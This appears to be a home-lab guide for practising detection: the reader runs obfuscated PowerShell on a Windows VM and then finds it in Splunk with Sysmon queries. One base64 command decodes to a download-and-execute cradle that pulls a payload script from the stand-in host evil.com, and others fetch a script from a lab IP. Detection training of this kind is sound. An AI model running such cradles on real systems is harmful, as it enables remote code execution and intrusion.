# Scenario 2: Suspicious PowerShell (Encoded Command) - Live Guide

## Overview
Execute encoded PowerShell commands to simulate obfuscated malicious activity. This is a common technique used by attackers to hide their commands.

---

## Step 1: Execute Suspicious PowerShell Commands

### 1.1 Open PowerShell on Windows 10 VM

**On Windows 10 VM:**

1. **Open PowerShell as Regular User** (NOT Administrator)
   - Press `Windows Key + R`
   - Type `powershell` and press Enter
   - OR search for "PowerShell" in Start Menu

   **Important:** Use regular user PowerShell, not Admin PowerShell (this simulates a normal user account being compromised)

### 1.2 Run Encoded PowerShell Command

**In PowerShell, run this command:**
```powershell
powershell -enc SQBFAFgA
```

**What this does:**
- `-enc` flag tells PowerShell to decode and execute a base64-encoded command
- `SQBFAFgA` is base64 for `IEX` (Invoke-Expression)
- This is a common obfuscation technique used by attackers

**Expected output:** The command will execute but may not show visible output (this is normal)

### 1.3 Run Additional Suspicious Commands

**Run these commands one by one in PowerShell:**

**Command 1: Longer encoded command**
```powershell
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
```

**Command 2: Simulated download command**
```powershell
powershell -Command "Invoke-WebRequest -Uri http://192.168.1.4/test.ps1 -OutFile C:\temp\test.ps1"
```

**Note:** The second command may fail (file path doesn't exist), but it will still generate Sysmon events!

**Command 3: Create the directory and try again**
```powershell
New-Item -ItemType Directory -Path C:\temp -Force
powershell -Command "Invoke-WebRequest -Uri http://192.168.1.4/test.ps1 -OutFile C:\temp\test.ps1"
```

### 1.4 Run More PowerShell Activity

**Generate additional PowerShell events:**
```powershell
# Execute PowerShell with suspicious parameters
powershell.exe -NoProfile -NonInteractive -Command "Get-Process"

# Encoded command that downloads content
powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA0AC8AdABlAHMAdAA=
```

---

## Step 2: Verify in Splunk

### 2.1 Wait for Logs to Arrive

**Important:** Wait 1-2 minutes after running PowerShell commands for Sysmon events to be forwarded to Splunk.

### 2.2 Open Splunk Web UI

1. Open browser on your host machine
2. Navigate to: `http://192.168.1.7:8000`
3. Login with your Splunk credentials

### 2.3 Search for PowerShell Process Creation

**In Splunk Search bar, paste:**
```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| head 20
```

**What you should see:**
- Multiple events with EventCode=1 (Process Creation)
- Image field contains `powershell.exe`
- CommandLine field shows the commands you ran
- Recent timestamps (within last few minutes)

### 2.4 Run Detection Query for Encoded Commands

**In Splunk Search bar:**
```spl
index=sysmon EventCode=1 Image="*powershell.exe" CommandLine="*-enc*"
```

**What to look for:**
- Events where CommandLine contains `-enc`
- Should show the encoded commands you executed
- May show multiple entries if you ran multiple encoded commands

### 2.5 Enhanced Detection Query

**Look for multiple suspicious PowerShell patterns:**
```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| where CommandLine LIKE "%enc%" OR CommandLine LIKE "%download%" OR CommandLine LIKE "%invoke%" OR CommandLine LIKE "%webrequest%"
| table _time, Image, CommandLine, ParentImage, User
| sort -_time
```

**This query will show:**
- All PowerShell executions with suspicious patterns
- The full command line
- Parent process information
- User who executed it
- Sorted by most recent first

### 2.6 View Process Tree

**See the relationship between processes:**
```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| table _time, Image, CommandLine, ParentImage, ParentCommandLine, User
| sort -_time
| head 10
```

**This helps you understand:**
- What process launched PowerShell
- The full command chain
- User context

---

## Step 3: Advanced Analysis

### 3.1 Count PowerShell Executions by Command Pattern

```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| eval suspicious=if(match(CommandLine, "(?i)(enc|download|invoke|webrequest|hidden|noprofile)"), "Suspicious", "Normal")
| stats count by suspicious, CommandLine
| sort -count
```

### 3.2 Timeline of PowerShell Activity

```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| timechart count by Image
```

### 3.3 Find PowerShell with Encoded Commands (Detailed)

```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| where CommandLine LIKE "%-enc%"
| eval encoded_part=replace(CommandLine, ".*-enc\s+([A-Za-z0-9+/=]+).*", "\1")
| table _time, Image, CommandLine, encoded_part, User, ParentImage
```

---

## ✅ Success Checklist

- [/] PowerShell commands executed on Windows 10
- [/] Multiple Sysmon Event ID 1 entries visible in Splunk
- [/] Detection query shows PowerShell with `-enc` parameter
- [/] CommandLine field shows the encoded commands
- [/] Enhanced detection query returns suspicious PowerShell activity

---

## 🐛 Troubleshooting

### No Sysmon events appearing?

1. **Check if Sysmon is running:**
   ```powershell
   Get-Service Sysmon
   # Should show "Running"
   ```

2. **Check Sysmon events in Event Viewer:**
   - Open Event Viewer
   - Navigate to: Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
   - Look for Event ID 1 entries
   - If events are here but not in Splunk, check Splunk Forwarder

3. **Verify Sysmon is generating events:**
   ```powershell
   # Run a simple command to generate an event
   notepad.exe
   # Then check Event Viewer for Sysmon Event ID 1
   ```

### Detection query not finding encoded commands?

1. **Check if CommandLine field exists:**
   ```spl
   index=sysmon EventCode=1 Image="*powershell.exe"
   | head 1
   | fieldsummary
   ```

2. **Try searching without wildcards:**
   ```spl
   index=sysmon EventCode=1 Image="powershell.exe" CommandLine="*enc*"
   ```

3. **Check exact field name:**
   ```spl
   index=sysmon EventCode=1 Image="*powershell.exe"
   | head 1
   ```
   Then manually inspect the CommandLine field in the results

### Field names different?

**Check available fields:**
```spl
index=sysmon EventCode=1
| head 1
| fieldsummary
```

**Common field name variations:**
- `CommandLine` might be `Command` or `ProcessCommandLine`
- `Image` might be `ImagePath` or `ProcessPath`
- Adjust queries based on actual field names

---

## 📊 What You Should See

### Expected Splunk Results:

1. **Basic Query Results:**
   - Multiple Event ID 1 entries
   - Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
   - CommandLine: Contains `-enc` and base64 strings

2. **Detection Query Results:**
   - Events filtered to show only PowerShell with `-enc` parameter
   - Should match the commands you executed

3. **Enhanced Query Results:**
   - Shows all suspicious PowerShell patterns
   - Includes encoded commands, download commands, invoke commands
   - Shows parent process information

---

## 📸 Screenshot Tips

Take screenshots of:
1. PowerShell commands being executed
2. Splunk search results showing Event ID 1 for PowerShell
3. Detection query results showing encoded commands
4. Enhanced detection query showing suspicious patterns
5. Process tree view showing parent/child relationships

These demonstrate your ability to detect obfuscated PowerShell attacks!

---

## 🎓 Learning Points

**Why this matters:**
- Attackers use encoded PowerShell to hide malicious commands
- `-enc` flag is a red flag in security monitoring
- Sysmon captures the full command line, even when encoded
- Detection requires looking at command-line arguments, not just process names

**Real-world context:**
- This technique is used in many malware campaigns
- PowerShell is often used for post-exploitation activities
- Encoded commands bypass basic signature detection
- SOC analysts need to detect these patterns

---

## ✅ Ready for Next Scenario?

Once you've verified:
- [/] PowerShell events are visible in Splunk
- [/] Detection queries work correctly
- [/] You understand what you're seeing

You're ready for **Scenario 3: Privilege Escalation**!

